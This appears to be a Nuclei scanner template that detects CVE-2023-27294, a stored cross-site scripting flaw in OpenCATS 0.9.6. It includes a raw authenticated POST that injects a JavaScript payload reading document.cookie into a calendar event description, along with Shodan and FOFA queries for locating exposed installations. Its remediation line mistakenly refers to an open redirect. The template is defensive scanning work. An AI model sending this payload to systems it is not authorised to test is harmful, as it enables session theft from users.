id: CVE-2023-27294

info:
  name:  OpenCATS - Authenticated Stored XSS
  author: woo4826, gy741, jyjyjy25, oriing, ANseunghyeon
  severity: medium
  description: |
    OpenCATS version 0.9.6 contains a vulnerability that allows an authenticated user to perform a stored cross-site scripting (XSS) attack. This vulnerability exists due to improper sanitization of user-supplied input within the calendar event description field. An attacker can exploit this vulnerability by injecting malicious JavaScript code into the description of a calendar event, which will be executed in the context of another userâ€™s browser when they view the event.
  impact: |
    An attacker can redirect users to malicious websites, leading to phishing attacks or the download of malware.
  remediation: |
    Apply the latest patch or update to the latest version of OpenCATS to fix the open redirect vulnerability.
  reference:
    - https://www.tenable.com/security/research/tra-2023-8
    - https://nvd.nist.gov/vuln/detail/CVE-2023-27294
    - https://github.com/ARPSyndicate/cvemon
  classification:
    cvss-metrics: AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:H/A:L
    cvss-score: 6.1
    cve-id: CVE-2023-27294
    cwe-id: CWE-79
    cpe: cpe:2.3:a:opencats:opencats:0.9.6:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: opencats
    product: opencats
    shodan-query:
      - title:"opencats"
      - http.title:"opencats"
    fofa-query: title="opencats"
    google-query: intitle:"opencats"
  tags: cve,cve2023,opencats,xss,authenticated,tenable

http:
  - raw:
    - |
      POST /index.php?m=calendar&view=MONTHVIEW&month=7&year=2024&week=-1&day=-1&a=addEvent  HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded
      Content-Length: {{Content-Length}}
      Cookie: CATS={{cats_session_token}}

      postback=postback&title=test&type=600&publicEntry=on&dateAdd=07-30-24&allDay=1&sendEmail=admin%40testdomain.com&reminderTime=15&description=%3Cimg+src%3D%22http://localhost%2Fimages%2FapplicationLogo.jpg%22+onload%3D%22alert%28document.cookie%29%22%3E&submit=Add+Event

    - |
      GET {{extracted_path}} HTTP/1.1
      Content-Length: {{Content-Length}}
      Cookie: CATS={{cats_session_token}}

    extractors:
    - type: regex
      part: header
      name: extracted_path
      internal: true
      regex:
        - \/index[^?]*(\S+)
              
    matchers:
      - type: word
        words:
          - "onload%3D%22alert%28document.cookie"

          
